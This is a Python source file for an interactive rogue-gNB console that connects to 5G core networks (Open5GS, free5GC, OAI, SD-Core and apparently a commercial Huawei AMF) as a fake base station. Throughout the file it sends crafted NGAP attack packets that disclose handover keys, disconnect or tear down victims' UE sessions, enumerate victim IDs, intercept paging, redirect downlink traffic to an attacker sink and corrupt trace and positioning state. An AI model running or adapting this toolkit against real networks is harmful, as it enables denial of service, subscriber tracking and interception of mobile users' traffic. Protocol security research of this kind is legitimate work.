"""Interactive two-level menu front-end for ngap_tester.

Level 1 = pick a core network (1..6). Selecting one connects over SCTP and does
NG Setup once; every packet you then send rides that same association.
Level 2 = pick which NGAP packet to send; you are prompted for just the fields
that packet needs (with sensible defaults). Victim AMF-UE-NGAP-ID can be typed,
or `sweep`-discovered (works where ids are small/sequential, e.g. Open5GS).

Run it via `menu.sh` (attaches the container to both net-5glab and kind so cores
1-3 @172.30.0.10 and core 4 @172.20.0.2 are all reachable):

    ./menu.sh

The packets are the SAME across all cores (a core only changes where we connect);
that is the whole point — one rogue-gNB toolkit, many 5GC targets.
"""
from __future__ import annotations

import json
import os
import socket

from . import ngap, builders as B, decode
from .gnb import FakeGNB

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Level-1: core registry. cfg path is relative to the package root.
CORES = {
    "1": ("Open5GS", "config/open5gs.json"),
    "2": ("free5GC", "config/free5gc.json"),
    "3": ("OAI CN5G", "config/oai.json"),
    "4": ("SD-Core", "config/sdcore.json"),
    "5": ("IPLOOK", "config/iplook.json"),
    "6": ("Agrand", "config/agrand.json"),
    "7": ("Huawei AMF", "config/huawei.json"),
}


# ------------------------------------------------------------------ prompts
def ask(prompt, default=None, cast=str):
    d = "" if default is None else f" [{default}]"
    while True:
        raw = input(f"  {prompt}{d}: ").strip()
        if not raw and default is not None:
            return default
        if not raw:
            continue
        try:
            return cast(raw)
        except Exception as e:
            print(f"    ! bad value ({e}); try again")


def ask_int(prompt, default=None):
    return ask(prompt, default, cast=lambda x: int(x, 0))


def ask_amf_ue_id(gnb):
    """Prompt for a victim AMF-UE-NGAP-ID.

    Huawei assigns a new random id every registration — never sweep, never
    reuse a previous number. Lab cores with small sequential ids may sweep.
    """
    huawei = str(gnb.cfg.get("amf_addr", "")).startswith("14.66") or str(gnb.cfg.get("mcc")) == "460"
    hint = "华为每次随机，填 extract-ue-ids 刚读到的数字，不要 sweep" if huawei \
        else "number, or 'sweep' to discover"
    raw = input(f"  victim AMF-UE-NGAP-ID ({hint}): ").strip()
    if raw.lower() == "sweep":
        if huawei:
            print("    华为 AU 随机，sweep 无效。先跑 ./deploy/extract-ue-ids.sh")
            return ask_int("victim AMF-UE-NGAP-ID")
        lo = ask_int("sweep from", 1)
        hi = ask_int("sweep to", 32)
        hits = _discover(gnb, lo, hi)
        if not hits:
            print("    (no live victims found in range; type an id manually)")
            return ask_int("victim AMF-UE-NGAP-ID")
        print(f"    live victims: {hits}")
        return ask_int("pick AMF-UE-NGAP-ID", hits[0])
    try:
        return int(raw, 0)
    except Exception:
        return ask_int("victim AMF-UE-NGAP-ID")


def _discover(gnb, lo, hi):
    """Path-switch probe over an id range; an ACK means that id is a live UE."""
    hits = []
    print(f"    probing AMF-UE-NGAP-ID {lo}..{hi} (Path Switch) ...")
    for i in range(lo, hi + 1):
        r = gnb.send(B.path_switch_request(i, 99, gnb.cfg,
                                           attacker_ip="127.0.0.1", teid=1), wait=True)
        if r and ngap.message_type(r) == "PathSwitchRequestAcknowledge":
            hits.append(i)
    return hits


# ------------------------------------------------------------------ packets
def p_ng_setup(gnb):
    resp = gnb.ng_setup()
    ok = ngap.message_type(resp) == "NGSetupResponse"
    print(f"  -> {'ACCEPTED' if ok else 'REJECTED: ' + str(ngap.message_type(resp))}")


def p_path_switch(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("attacker RAN-UE-NGAP-ID", 99)
    pdu = ask("PDU session ids (csv)", "1", cast=lambda s: [int(x) for x in s.split(",")])
    ip = ask("attacker N3 IP ('auto' = this container)", "auto")
    if ip == "auto":
        ip = _local_ip(gnb.cfg["amf_addr"])
    teid = ask_int("attacker TEID", 0x11111111)
    r = gnb.send(B.path_switch_request(v, ran, gnb.cfg, pdu_sessions=pdu,
                                       attacker_ip=ip, teid=teid))
    if r and ngap.message_type(r) == "PathSwitchRequestAcknowledge":
        print("\n  === CROSS-gNB DISCLOSURE ===")
        print("  " + decode.summarize_leak(decode.path_switch_ack_leak(r)).replace("\n", "\n  "))
    elif r:
        print(f"  reply: {ngap.message_type(r)}")
    else:
        print("  no decodable reply (raw kept above if any)")


def p_ue_release(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    r = gnb.send(B.ue_context_release_request(v, ran))
    print(f"  -> {ngap.message_type(r) if r else '(no reply to us)'}")


def p_error_indication(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    gnb.send(B.error_indication(v, ran), wait=False)
    print("  sent (Class-2, no direct reply; check AMF log / victim state)")


def p_ng_reset(gnb):
    spec = ask("targets 'amf[:ran],...' (bare amf = AMF-UE-ID-only path)", "1:99")
    pairs = []
    for p in spec.split(","):
        bits = p.split(":")
        pairs.append((int(bits[0], 0), int(bits[1], 0) if len(bits) > 1 else None))
    r = gnb.send(B.ng_reset_partial(pairs))
    print(f"  -> {ngap.message_type(r) if r else '(no reply)'}")


def p_handover_required(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    tgt = ask_int("target gNB-id (attacker-named)", 0xABCDE)
    r = gnb.send(B.handover_required(v, ran, gnb.cfg, target_gnb_id=tgt))
    print(f"  -> {ngap.message_type(r) if r else '(no reply to us)'}")


def p_ran_config_update(gnb):
    tac = ask_int("victim TAC to claim", int(gnb.cfg["tac"]))
    listen = ask("listen seconds for intercepted PAGING", "30", cast=float)
    r = gnb.send(B.ran_configuration_update(gnb.cfg, tac=tac), wait=True)
    print(f"  claim TAI -> {ngap.message_type(r) if r else '(no ack)'}; "
          f"listening {listen}s (page an idle victim now)...")
    n = [0]

    def on_msg(pdu):
        if ngap.message_type(pdu) == "Paging":
            info = decode.paging_info(pdu)
            n[0] += 1
            print(f"    [PAGING] 5G-S-TMSI={info.get('fiveg_s_tmsi')} TAIs={info.get('tais')}")
    gnb.listen(listen, on_msg)
    print(f"  done ({n[0]} PAGING intercepted)")


def p_ul_ran_config_transfer(gnb):
    tgt = ask_int("target gNB-id to inject SON toward", 0x1)
    gnb.send(B.uplink_ran_configuration_transfer(gnb.cfg, target_gnb_id=tgt), wait=False)
    print("  sent (AMF should blind-relay Downlink RAN Config Transfer to target)")


def p_gtpu_sink(gnb):
    from . import gtpu_sink
    dur = ask("listen seconds (blank = until Ctrl-C)", "30",
              cast=lambda s: None if not s else float(s))
    gtpu_sink.run_sink(duration=dur)


def p_sweep(gnb):
    lo = ask_int("sweep from", 1)
    hi = ask_int("sweep to", 32)
    hits = _discover(gnb, lo, hi)
    print(f"  live victims (Path Switch ACK): {hits}")


def p_pdu_notify(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    gnb.send(B.pdu_session_resource_notify(v, ran), wait=False)
    print("  sent (Class-2; check AMF log / victim session state)")


def p_handover_notify(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    gnb.send(B.handover_notify(v, ran, gnb.cfg), wait=False)
    print("  sent (Class-2; on OAI may rebind serving gNB -> attacker)")


def p_nrppa(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    gnb.send(B.uplink_ue_associated_nrppa_transport(v, ran), wait=False)
    print("  sent (Class-2; injects NRPPa toward the victim's LMF positioning)")


def p_cell_trace(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    ip = ask("Trace Collection Entity IP (attacker)", _local_ip(gnb.cfg["amf_addr"]))
    gnb.send(B.cell_traffic_trace(v, ran, gnb.cfg, tce_ip=ip), wait=False)
    print("  sent (Class-2; on SD-Core rebinds + corrupts trace state)")


def p_ran_status(gnb):
    v = ask_amf_ue_id(gnb)
    ran = ask_int("RAN-UE-NGAP-ID", 99)
    gnb.send(B.uplink_ran_status_transfer(v, ran), wait=False)
    print("  sent (Class-2; corrupts a mid-handover victim's PDCP state on OAI)")


def p_run_case(gnb):
    """Run a catalogued attack CASE by id (from docs/cases + ngaptester/cases_*)."""
    try:
        from . import cases
    except Exception as e:
        print(f"  case registry unavailable: {e}")
        return
    if not cases.ALL_CASES:
        print("  no cases loaded (case_*.py modules not present yet).")
        return
    print(f"  {cases.summary()}")
    flt = input("  filter by prefix (e.g. p01, g09) or blank for all: ").strip()
    shown = [c for c in cases.ALL_CASES if not flt or c["id"].startswith(flt)]
    for c in shown[:60]:
        print(f"    {c['id']:10s} {c.get('msg',''):30s} {c.get('desc','')}")
    cid = input("  case id to send (blank to cancel): ").strip()
    if not cid:
        return
    try:
        pdu = cases.build(cid, gnb.cfg)
    except KeyError:
        print(f"  no such case id: {cid}"); return
    r = gnb.send(pdu)
    print(f"  sent {cid} -> {ngap.message_type(r) if r else '(no reply / one-way)'}")


def p_todo(_gnb):
    print("  [not implemented yet] source-flagged; builder pending — see docs/00_TEST_PLAN.md")


# label, handler, one-line note
PACKETS = [
    ("NG Setup (reconnect / connectivity)", p_ng_setup, "milestone"),
    ("Path Switch Request", p_path_switch, "key {NH,NCC}(+N3) disclosure"),
    ("UE Context Release Request", p_ue_release, "remote UE disconnect (SD-Core/OAI)"),
    ("Error Indication (UE-assoc)", p_error_indication, "cross-UE release (Open5GS)"),
    ("NG Reset (partOfNG-Interface)", p_ng_reset, "cross-gNB teardown (Open5GS)"),
    ("Handover Required", p_handover_required, "forced relocation / cond. disclosure"),
    ("RAN Configuration Update (+paging listen)", p_ran_config_update, "false-TAI paging intercept"),
    ("Uplink RAN Config Transfer (SON inject)", p_ul_ran_config_transfer, "blind SON/Xn relay"),
    ("GTP-U sink (receive redirected downlink)", p_gtpu_sink, "T02 interception receiver"),
    ("Sweep / discover live victims", p_sweep, "enumerate AMF-UE-NGAP-ID"),
    ("Run attack CASE by id", p_run_case, "catalogued p/g cases (docs/cases + cases_*.py)"),
    ("PDU Session Resource Notify", p_pdu_notify, "p06 (SD-Core)"),
    ("Handover Notification", p_handover_notify, "p09 (OAI) — rebind serving gNB"),
    ("Uplink UE-assoc NRPPa", p_nrppa, "p16 (OAI) — NRPPa into victim LMF"),
    ("Cell Traffic Trace", p_cell_trace, "p17 (SD-Core) — trace-state corruption"),
    ("Uplink RAN Status Transfer", p_ran_status, "p21 (OAI) — needs in-progress HO"),
    ("Handover Cancel", p_todo, "p04 (Open5GS) — TODO, needs in-progress HO"),
    ("Uplink Non-UE NRPPa", p_todo, "g10 (OAI) — TODO"),
]


# ------------------------------------------------------------------ plumbing
def _local_ip(peer_ip, peer_port=38412):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((peer_ip, peer_port))
        return s.getsockname()[0]
    finally:
        s.close()


def _load_cfg(path):
    with open(os.path.join(HERE, path)) as f:
        return json.load(f)


def _connect_core(name, cfg_path):
    cfg = _load_cfg(cfg_path)
    if cfg.get("amf_addr", "REPLACE_ME") == "REPLACE_ME":
        print(f"  {name} config has no amf_addr yet.")
        cfg["amf_addr"] = ask("AMF N2 address (ip)", None)
        cfg["amf_port"] = ask_int("AMF N2 port", 38412)
    print(f"\n[{name}] connecting SCTP -> {cfg['amf_addr']}:{cfg.get('amf_port', 38412)} ...")
    gnb = FakeGNB(cfg)
    try:
        gnb.connect()
    except Exception as e:
        print(f"  ! SCTP connect failed: {e}")
        return None
    print("[NG Setup] sending ...")
    try:
        resp = gnb.ng_setup()
    except Exception as e:
        print(f"  ! NG Setup failed: {e}")
        gnb.close()
        return None
    if ngap.message_type(resp) != "NGSetupResponse":
        print(f"  ! NG Setup REJECTED: {ngap.message_type(resp)}")
        gnb.close()
        return None
    print("  -> NG Setup ACCEPTED. This fake gNB is now an accepted NG-RAN node.\n")
    return gnb


def _packet_menu(name, gnb):
    while True:
        print(f"\n===== [{name}] packet menu =====")
        for i, (label, _h, note) in enumerate(PACKETS, 1):
            print(f"  {i:>2}. {label}  —  {note}")
        print("   0. back to core menu")
        choice = input("select packet #: ").strip()
        if choice == "0":
            return
        try:
            idx = int(choice) - 1
            assert 0 <= idx < len(PACKETS)
        except Exception:
            print("  ! invalid choice")
            continue
        label, handler, _ = PACKETS[idx]
        print(f"\n--- {label} ---")
        try:
            handler(gnb)
        except (KeyboardInterrupt, EOFError):
            print("\n  (cancelled)")
        except Exception as e:
            print(f"  ! error: {e}")


def main():
    print("=" * 60)
    print(" ngap_tester — interactive rogue-gNB console (authorized lab use)")
    print("=" * 60)
    while True:
        print("\n===== core network =====")
        for k, (name, _p) in CORES.items():
            print(f"  {k}. {name}")
        print("  0. exit")
        choice = input("select core #: ").strip()
        if choice == "0":
            print("bye.")
            return
        if choice not in CORES:
            print("  ! invalid choice")
            continue
        name, cfg_path = CORES[choice]
        gnb = _connect_core(name, cfg_path)
        if not gnb:
            continue
        try:
            _packet_menu(name, gnb)
        finally:
            gnb.close()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        print("\nbye.")
